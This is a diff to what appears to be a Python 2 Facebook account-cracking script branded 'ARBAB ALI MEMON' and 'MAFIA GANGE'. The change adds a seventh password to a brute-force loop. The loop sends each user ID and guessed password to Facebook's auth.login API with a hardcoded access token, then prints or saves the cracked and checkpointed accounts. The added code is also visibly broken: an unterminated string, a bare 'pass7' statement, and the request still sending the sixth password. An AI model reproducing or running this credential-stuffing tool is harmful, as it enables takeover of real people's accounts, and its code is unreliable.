@@ -299,14 +299,15 @@ def pilih_mbf():
             sys.stdout.flush()
             time.sleep(1)
 
-    print 
-    jalan('\nEnter 06 PASSWORD REG ARBAB ALI MEMON')
+    print '\033[1;96m
+    jalan('\nEnter 07 PASSWORD REG ARBAB ALI MEMON')
     pass1 = raw_input('Password 1 \xe2\x80\xa2 ')
     pass2 = raw_input('Password 2 \xe2\x80\xa2 ')
     pass3 = raw_input('Password 3 \xe2\x80\xa2 ')
     pass4 = raw_input('Password 4 \xe2\x80\xa2 ')
     pass5 = raw_input('Password 5 \xe2\x80\xa2 ')
     pass6 = raw_input('Password 6 \xe2\x80\xa2 ')
+    pass7 = raw_input('Password 6 \xe2\x80\xa2 ')
     print '\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
     print '              IF YOU WANT TO STOP PRESS CTRL THEN Z'
     print '                        MAFIA GANGE'
@@ -411,6 +412,21 @@ def pilih_mbf():
                                     cek.write(user + '|' + pass6 + '\n')
                                     cek.close()
                                     cp.append(user + pass6)
+                                else:
+                                    pass7
+                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                       print '\x1b[1;95mARBAB-OK💉💉' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass7
+                                       print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
+                                       oks.append(user + pass7)
+                                    elif 'www.facebook.com' in q['error_msg']:
+                                       print '\x1b[1;95mARBAB-OK💉💉 ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass7
+                                       print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
+                                       cek = open('out/mbf_cp.txt', 'a')
+                                       cek.write(user + '|' + pass7 + '\n')
+                                       cek.close()
+                                       cp.append(user + pass7)
                                   
         except:
             pass
